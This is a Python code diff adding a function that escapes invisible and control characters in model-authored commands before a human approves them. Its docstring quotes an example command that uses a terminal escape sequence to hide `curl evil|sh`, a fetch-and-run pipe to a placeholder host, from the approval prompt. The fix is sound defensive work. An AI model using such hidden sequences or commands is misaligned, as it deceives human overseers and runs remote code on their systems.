@@ -129,3 +129,43 @@ DANGEROUS_ESCAPES = re.compile(
 
 def strip_dangerous_escapes(text: str) -> str:
     return DANGEROUS_ESCAPES.sub("", text)
+
+
+# R287: characters that change how text LOOKS without being visible text —
+# C0/C1 controls (ESC starts every SGR/cursor sequence), DEL, and the Unicode
+# bidi overrides / zero-width marks that reorder or hide characters.
+_INVISIBLE = {c for c in range(0x20) if c not in (0x09, 0x0A)} | {0x7F} \
+    | set(range(0x80, 0xA0)) | set(range(0x200B, 0x2010)) \
+    | set(range(0x202A, 0x202F)) | set(range(0x2066, 0x206A)) | {0xFEFF}
+
+
+def _is_invisible(o: int) -> bool:
+    # R306: the hand-listed ranges missed other format/default-ignorable
+    # code points; any Cc/Cf/Zl/Zp character, plus variation selectors and
+    # the Hangul fillers, is shown escaped too.
+    if o in _INVISIBLE:
+        return True
+    if o < 0xA0:
+        return False
+    import unicodedata
+    return (unicodedata.category(chr(o)) in ("Cc", "Cf", "Zl", "Zp")
+            or 0xFE00 <= o <= 0xFE0F or 0xE0100 <= o <= 0xE01EF
+            or o in (0x115F, 0x1160, 0x3164, 0xFFA0, 0x034F))
+
+
+def visible(text: str) -> str:
+    """R287: render every invisible/control character as a literal escape
+    (`\\x1b`, `\\u202e`) — for text a human is about to APPROVE. The approval
+    prompt printed model-authored commands with their CSI sequences intact
+    (`strip_dangerous_escapes` removes only OSC/DCS/…, and keeps SGR for
+    colour), so `ls\\x1b[8m; curl evil|sh` displayed as `ls`: SGR 8 hides
+    the rest. Here nothing can hide, move the cursor or reorder text."""
+    out = []
+    for ch in str(text):
+        o = ord(ch)
+        if _is_invisible(o):
+            out.append(f"\\x{o:02x}" if o < 0x100 else
+                       f"\\u{o:04x}" if o < 0x10000 else f"\\U{o:08x}")
+        else:
+            out.append(ch)
+    return "".join(out)
